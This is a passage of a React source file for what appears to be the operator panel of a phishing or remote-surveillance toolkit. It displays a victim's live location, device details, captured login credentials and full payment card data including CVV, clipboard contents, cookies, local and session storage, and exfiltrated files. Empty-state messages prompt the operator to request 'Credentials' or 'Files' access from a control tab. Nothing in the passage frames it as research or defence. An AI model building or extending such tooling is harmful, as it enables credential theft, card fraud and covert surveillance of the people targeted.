                          <a href={`https://www.google.com/maps?q=${liveLocation.latitude},${liveLocation.longitude}`} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 text-xs text-primary hover:underline" data-testid="link-view-map"><ExternalLink className="w-3 h-3" />Google Maps</a>
                        </div>
                      ) : <div className="flex items-center justify-center h-24 text-xs text-muted-foreground">Waiting for location...</div>}
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><Smartphone className="w-4 h-4 text-purple-400" />Device Info</span>
                        {liveDeviceInfo && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(JSON.stringify(liveDeviceInfo, null, 2), "Device info")} data-testid="button-copy-device-info"><Clipboard className="w-3 h-3 mr-1" />JSON</Button>}
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      {liveDeviceInfo ? (
                        <div className="space-y-1 text-xs max-h-48 overflow-y-auto">
                          {Object.entries(liveDeviceInfo).map(([k, v]) => (
                            <div key={k} className="flex justify-between items-center py-0.5 border-b border-border/20 last:border-0">
                              <span className="text-muted-foreground capitalize text-[10px]">{k.replace(/([A-Z])/g, " $1").trim()}</span>
                              <span className="font-mono text-right max-w-[55%] truncate text-[10px]" data-testid={`text-device-${k}`}>{typeof v === "object" ? JSON.stringify(v) : String(v)}</span>
                            </div>
                          ))}
                        </div>
                      ) : <div className="flex items-center justify-center h-24 text-xs text-muted-foreground">Waiting...</div>}
                    </CardContent>
                  </Card>
                </div>
              </TabsContent>

              <TabsContent value="intel" className="space-y-4 mt-4">
                <Card className="border-red-500/20">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2"><KeyRound className="w-4 h-4 text-red-400" />Captured Credentials ({liveCredentials.length})</span>
                      {liveCredentials.length > 0 && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(JSON.stringify(liveCredentials, null, 2), "Credentials")} data-testid="button-copy-credentials"><Clipboard className="w-3 h-3 mr-1" />Copy All</Button>}
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {liveCredentials.length > 0 ? (
                      <div className="space-y-2">
                        {liveCredentials.map((cred, i) => (
                          <div key={i} className="p-3 rounded-lg bg-red-500/5 border border-red-500/20" data-testid={`credential-item-${i}`}>
                            <div className="flex items-center gap-2 mb-2">
                              {cred.type === "login" ? <KeyRound className="w-4 h-4 text-red-400" /> : <CreditCard className="w-4 h-4 text-red-400" />}
                              <span className="text-xs font-medium">{cred.type === "login" ? "Login Credentials" : "Payment Card"}</span>
                              <span className="text-[10px] text-muted-foreground ml-auto">{new Date(cred.timestamp).toLocaleTimeString()}</span>
                            </div>
                            <div className="grid gap-1 text-xs">
                              {cred.type === "login" ? (
                                <>
                                  <div className="flex justify-between"><span className="text-muted-foreground">Email:</span><span className="font-mono" data-testid={`text-cred-email-${i}`}>{cred.email}</span></div>
                                  <div className="flex justify-between"><span className="text-muted-foreground">Password:</span><span className="font-mono" data-testid={`text-cred-password-${i}`}>{cred.password}</span></div>
                                </>
                              ) : (
                                <>
                                  <div className="flex justify-between"><span className="text-muted-foreground">Name:</span><span className="font-mono">{cred.cardName}</span></div>
                                  <div className="flex justify-between"><span className="text-muted-foreground">Card:</span><span className="font-mono" data-testid={`text-cred-card-${i}`}>{cred.cardNumber}</span></div>
                                  <div className="flex justify-between"><span className="text-muted-foreground">Expiry:</span><span className="font-mono">{cred.cardExpiry}</span></div>
                                  <div className="flex justify-between"><span className="text-muted-foreground">CVV:</span><span className="font-mono">{cred.cardCvv}</span></div>
                                </>
                              )}
                            </div>
                          </div>
                        ))}
                      </div>
                    ) : <p className="text-xs text-muted-foreground text-center py-6">No credentials captured yet. Request "Credentials" access from the Control tab.</p>}
                  </CardContent>
                </Card>

                <div className="grid gap-4 md:grid-cols-2">
                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><ClipboardPaste className="w-4 h-4 text-orange-400" />Clipboard ({liveClipboard.length})</span>
                        {liveClipboard.length > 0 && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(liveClipboard.map((c) => c.content).join("\n---\n"), "Clipboard")} data-testid="button-copy-clipboard"><Clipboard className="w-3 h-3 mr-1" />Copy</Button>}
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      {liveClipboard.length > 0 ? (
                        <div className="space-y-2 max-h-48 overflow-y-auto">
                          {liveClipboard.map((clip, i) => (
                            <div key={i} className="p-2 rounded bg-muted/30 border border-border/30" data-testid={`clipboard-item-${i}`}>
                              <p className="text-[10px] text-muted-foreground mb-1">{new Date(clip.timestamp).toLocaleTimeString()}</p>
                              <p className="text-xs font-mono whitespace-pre-wrap break-all">{clip.content || "(empty)"}</p>
                            </div>
                          ))}
                        </div>
                      ) : <p className="text-xs text-muted-foreground text-center py-6">No clipboard data yet.</p>}
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><Globe className="w-4 h-4 text-cyan-400" />Browser Data</span>
                        {liveBrowserData && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(JSON.stringify(liveBrowserData, null, 2), "Browser data")} data-testid="button-copy-browser-data"><Clipboard className="w-3 h-3 mr-1" />JSON</Button>}
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      {liveBrowserData ? (
                        <div className="space-y-3 text-xs max-h-64 overflow-y-auto">
                          <div>
                            <p className="font-medium text-muted-foreground mb-1">Cookies</p>
                            <p className="font-mono text-[10px] break-all bg-muted/30 p-2 rounded">{liveBrowserData.cookies}</p>
                          </div>
                          <div>
                            <p className="font-medium text-muted-foreground mb-1">LocalStorage ({liveBrowserData.localStorageCount} keys)</p>
                            {Object.entries(liveBrowserData.localStorageKeys || {}).slice(0, 10).map(([k, v]) => (
                              <div key={k} className="flex justify-between py-0.5 border-b border-border/20">
                                <span className="text-muted-foreground truncate max-w-[40%] text-[10px]">{k}</span>
                                <span className="font-mono truncate max-w-[55%] text-[10px]">{String(v)}</span>
                              </div>
                            ))}
                          </div>
                          <div>
                            <p className="font-medium text-muted-foreground mb-1">SessionStorage ({liveBrowserData.sessionStorageCount} keys)</p>
                            {Object.entries(liveBrowserData.sessionStorageKeys || {}).slice(0, 10).map(([k, v]) => (
                              <div key={k} className="flex justify-between py-0.5 border-b border-border/20">
                                <span className="text-muted-foreground truncate max-w-[40%] text-[10px]">{k}</span>
                                <span className="font-mono truncate max-w-[55%] text-[10px]">{String(v)}</span>
                              </div>
                            ))}
                          </div>
                          <div className="grid grid-cols-2 gap-2">
                            <div className="bg-muted/30 p-2 rounded"><span className="text-muted-foreground">History Length</span><p className="font-mono">{liveBrowserData.historyLength}</p></div>
                            <div className="bg-muted/30 p-2 rounded"><span className="text-muted-foreground">Plugins</span><p className="font-mono">{liveBrowserData.plugins?.length || 0}</p></div>
                          </div>
                          {liveBrowserData.plugins?.length > 0 && (
                            <div><p className="font-medium text-muted-foreground mb-1">Plugins</p>{liveBrowserData.plugins.map((p: string, i: number) => <p key={i} className="text-[10px] font-mono">{p}</p>)}</div>
                          )}
                        </div>
                      ) : <p className="text-xs text-muted-foreground text-center py-6">No browser data yet.</p>}
                    </CardContent>
                  </Card>
                </div>
              </TabsContent>

              <TabsContent value="files" className="space-y-4 mt-4">
                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2"><FileText className="w-4 h-4 text-orange-400" />Files Received ({liveFiles.length})</span>
                      {liveFiles.length > 0 && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={downloadAllFiles} data-testid="button-download-all-files"><Download className="w-3 h-3 mr-1" />Download All</Button>}
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {liveFiles.length > 0 ? (
                      <div className="grid gap-2 sm:grid-cols-2 lg:grid-cols-3">
                        {liveFiles.map((file, i) => (
                          <div key={i} className="flex items-center gap-2 p-2 rounded-lg bg-muted/30 border border-border/30" data-testid={`file-item-${i}`}>
                            {file.preview && file.type?.startsWith("image/") ? (
                              <img src={file.preview} alt={file.name} className="w-10 h-10 rounded object-cover" />
                            ) : (
                              <div className="w-10 h-10 rounded bg-muted flex items-center justify-center"><FileText className="w-5 h-5 text-muted-foreground" /></div>
                            )}
                            <div className="flex-1 min-w-0">
                              <p className="text-xs font-medium truncate">{file.name}</p>
                              <p className="text-[10px] text-muted-foreground">{file.type} - {(file.size / 1024).toFixed(1)} KB</p>
                            </div>
                            <Button size="sm" variant="ghost" className="h-6 w-6 p-0" onClick={() => downloadFile(file)} data-testid={`button-download-file-${i}`}><Download className="w-3 h-3" /></Button>
                          </div>
                        ))}
                      </div>
                    ) : <p className="text-xs text-muted-foreground text-center py-8">No files received yet. Request "Files" access from the Control tab.</p>}
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="events" className="space-y-4 mt-4">
                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2"><Activity className="w-4 h-4 text-cyan-400" />Session Events ({events.length})</span>
                      <div className="flex items-center gap-1">
                        <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={selectAllEvents} data-testid="button-select-all-events"><ListChecks className="w-3 h-3 mr-1" />All</Button>
                        <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={deselectAllEvents} data-testid="button-deselect-all-events">None</Button>
                      </div>
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {selectedEventsCount > 0 && (
                      <div className="flex items-center gap-2 mb-3 p-2 rounded-lg bg-primary/5 border border-primary/20">
                        <span className="text-xs text-muted-foreground">{selectedEventsCount} selected</span>
                        <div className="flex items-center gap-1 ml-auto">
                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={exportSelectedEvents} data-testid="button-export-events"><Download className="w-3 h-3 mr-1" />Export JSON</Button>
                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={copySelectedEvents} data-testid="button-copy-events"><Copy className="w-3 h-3 mr-1" />Copy</Button>
                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px] text-red-400" onClick={clearSelectedEvents} data-testid="button-clear-events"><Trash2 className="w-3 h-3 mr-1" />Clear</Button>
                        </div>
                      </div>
                    )}
                    {events.length > 0 ? (
                      <div className="space-y-1 max-h-96 overflow-y-auto">
                        {events.map((evt) => {
                          const colorMap: Record<string, string> = { credential: "text-red-400", permission: "text-yellow-400", connection: "text-green-400", control: "text-blue-400", data: "text-purple-400", action: "text-orange-400", request: "text-cyan-400", system: "text-muted-foreground" };
                          return (
                            <div key={evt.id} className={`flex items-start gap-2 p-2 rounded text-xs hover:bg-muted/30 cursor-pointer ${evt.selected ? "bg-primary/5 border border-primary/20" : ""}`} onClick={() => toggleEventSelect(evt.id)} data-testid={`event-item-${evt.id}`}>
                              <Checkbox checked={evt.selected} className="mt-0.5" />
                              <ChevronRight className={`w-3 h-3 mt-0.5 flex-shrink-0 ${colorMap[evt.type] || "text-muted-foreground"}`} />
                              <div className="flex-1 min-w-0">
                                <div className="flex items-center gap-2">
                                  <Badge variant="secondary" className="text-[9px] px-1 py-0">{evt.type}</Badge>
                                  <span className="text-[10px] text-muted-foreground">{new Date(evt.timestamp).toLocaleTimeString()}</span>
                                </div>
                                <p className="text-muted-foreground mt-0.5 break-all">{evt.details}</p>
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    ) : <p className="text-xs text-muted-foreground text-center py-8">No events yet. Actions will be logged here.</p>}
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          )}
        </div>
      )}
    </div>
  );
}
